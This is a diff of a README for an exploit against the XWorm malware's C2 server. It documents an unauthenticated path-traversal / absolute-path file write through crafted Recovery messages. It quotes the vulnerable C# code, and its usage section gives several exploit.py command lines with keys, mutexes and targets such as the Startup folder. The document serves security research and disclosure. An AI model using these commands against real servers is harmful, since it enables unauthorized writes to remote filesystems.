@@ -1,4 +1,4 @@
-# XWorm C2 Path Traversal Vulnerability
+# XWorm C2 Absolute Path Traversal Vulnerability
 
 ## Affected Versions
 
@@ -7,9 +7,9 @@
 
 ## What is Vulnerable
 
-The XWorm C2 server accepts Recovery messages from any connected client without requiring the C2 to first request the data, and uses the client-supplied HWID directly in file path construction without validation, allowing path traversal to write files anywhere on the C2 filesystem.
+The XWorm C2 server accepts Recovery messages from any connected client without requiring the C2 to first request the data, and uses the client-supplied HWID directly in file path construction with **ZERO validation**, allowing arbitrary absolute path writes anywhere on the C2 filesystem.
 
-When a client sends recovery data (stolen credentials, browser data, etc.), the C2 server uses the client's HWID (Hardware ID) to construct a file path. This HWID is not validated, allowing path traversal sequences like `..\..\..` to write files outside the intended directory. The C2 processes these Recovery messages immediately upon receipt without any authentication or validation that the client was actually asked to send this data.
+When a client sends recovery data (stolen credentials, browser data, etc.), the C2 server uses the client's HWID (Hardware ID) to construct a file path. This HWID has no validation whatsoever - it accepts both relative path traversal sequences (`..\..\..`) and absolute paths (`C:\Target`). The C2 processes these Recovery messages immediately upon receipt without any authentication or validation that the client was actually asked to send this data.
 
 **Vulnerable code location:** `Messages.cs` line 577
 
@@ -18,28 +18,23 @@ string text4 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], 
 File.WriteAllText(text4 + "\\FileZilla_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
 ```
 
-The `array[1]` parameter is the HWID sent by the client. It goes directly into `Path.Combine()` without any validation. Since `Path.Combine()` doesn't prevent traversal sequences, an attacker can escape the `ClientsFolder` directory and write files to arbitrary locations on the C2 server's filesystem.
+The `array[1]` parameter is the HWID sent by the client. It goes directly into `Path.Combine()` without any validation. When `Path.Combine()` receives an absolute path as the second parameter, it **ignores the first parameter entirely** and uses only the absolute path. This means an attacker can write files to any location on the C2 server's filesystem by simply providing an absolute path as the HWID.
 
 ## How the Exploit Works
 
-The exploit connects to the XWorm C2 server and sends a crafted Recovery message with a malicious HWID containing path traversal sequences. The C2 server processes this message and writes the provided content to a file at the traversed location.
+The exploit connects to the XWorm C2 server and sends a crafted Recovery message with an absolute Windows path as the HWID. The C2 server processes this message and writes the provided content to a file at the specified location.
 
 **Message format:**
 ```
 Recovery<SEPARATOR>HWID<SEPARATOR>TYPE<SEPARATOR>CONTENT
 ```
 
-**Example traversal HWID:**
+**Example absolute path HWID:**
 ```
-..\..\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-```
-
-This traversal goes up from the normal path:
-```
-C:\Users\User\Downloads\XWorm V6.4\ClientsFolder\<HWID>\Recovery\
+C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 ```
 
-To reach:
+When `Path.Combine()` receives this absolute path, it ignores the `Application.StartupPath` and `ClientsFolder` components, resulting in:
 ```
 C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Recovery\
 ```
@@ -52,9 +47,9 @@ This vulnerability has significant limitations that prevent direct remote code e
 
 1. **Hardcoded subfolder:** The C2 always appends `\Recovery\` to the path. You cannot write directly to a target folder - files always end up in a `Recovery` subdirectory.
 
-2. **Hardcoded filename:** Files are named `FileZilla_<timestamp>.txt`. You cannot control the filename.
+2. **Hardcoded filename:** Files are named based on recovery type with timestamp (e.g., `FileZilla_<timestamp>.txt`, `WifiKeys_<timestamp>.txt`). You cannot fully control the filename.
 
-3. **Hardcoded extension:** All files get a `.txt` extension. You cannot write `.bat`, `.exe`, or other executable extensions directly.
+3. **Hardcoded extension:** All recovery types write `.txt` files. You cannot write `.bat`, `.exe`, or other executable extensions directly.
 
 ## Using the Exploit
 
@@ -70,46 +65,66 @@ You need three values from the XWorm sample's `Settings.cs` file:
 - `Settings.SPL` - Base64-encoded message separator  
 - `Settings.Mutex` - Mutex string
 
-**Test the vulnerability:**
+**Basic usage:**
 ```bash
-python exploit.py <C2_IP> <C2_PORT> \
+python exploit.py <C2_IP> <C2_PORT> <ABSOLUTE_PATH> \
   --key "<BASE64_KEY>" \
   --spl "<BASE64_SPL>" \
-  --mutex "<MUTEX>" \
-  --test
+  --mutex "<MUTEX>"
 ```
 
-This writes a test file. Check the C2 directory for `VULN_TEST\Recovery\FileZilla_*.txt` outside `ClientsFolder` to confirm the vulnerability exists.
+**Examples:**
 
-**Run the exploit:**
+Test the vulnerability:
 ```bash
-python exploit.py <C2_IP> <C2_PORT> \
-  --key "<BASE64_KEY>" \
-  --spl "<BASE64_SPL>" \
-  --mutex "<MUTEX>" \
-  --exploit \
-  --path "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" \
-  --depth 4
+python exploit.py 192.168.1.100 5555 C:\Test \
+  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
+  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
+  --mutex "bIqDjMjopgCoADn2"
 ```
 
-**Parameters:**
-- `--path`: Target directory path (relative from user directory)
-- `--depth`: Number of `..` traversals needed (default: 4)
-  - Depth depends on C2 installation location
-  - From `C:\Users\User\Downloads\XWorm V6.4\ClientsFolder\<HWID>\Recovery\` use depth 4
-  - From `C:\XWorm\ClientsFolder\<HWID>\Recovery\` use depth 3
-  - Test with `--test` first to determine correct depth
-
-**With custom payload:**
+Write to XWorm Plugins directory:
 ```bash
-python exploit.py 192.168.1.100 5552 \
+python exploit.py 192.168.1.100 5555 C:\XWorm\Plugins \
+  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
+  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
+  --mutex "bIqDjMjopgCoADn2"
+```
+
+Write to Startup folder:
+```bash
+python exploit.py 192.168.1.100 5555 "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" \
+  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
+  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
+  --mutex "bIqDjMjopgCoADn2"
+```
+
+With custom payload file:
+```bash
+python exploit.py 192.168.1.100 5555 C:\Target \
   --key "Njz2LrOsHpe83Y8FmEzXSw==" \
   --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
   --mutex "bIqDjMjopgCoADn2" \
-  --exploit \
-  --path "Users\Public\Desktop" \
-  --depth 5 \
   --payload payload.txt
 ```
 
-The file will be written to: `<target_path>\Recovery\FileZilla_<timestamp>.txt`
+Use different recovery type:
+```bash
+python exploit.py 192.168.1.100 5555 C:\Target \
+  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
+  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
+  --mutex "bIqDjMjopgCoADn2" \
+  --type 2
+```
+
+**Recovery Types:**
+
+All recovery types write `.txt` files with different names:
+- `--type 0` (default): `FileZilla_<timestamp>.txt`
+- `--type 1`: `WifiKeys_<timestamp>.txt`
+- `--type 2`: `Discord_<timestamp>.txt`
+- `--type 3`: `ProductKey_<timestamp>.txt`
+
+**Result:**
+
+Files are written to: `<ABSOLUTE_PATH>\Recovery\<name>_<timestamp>.txt`
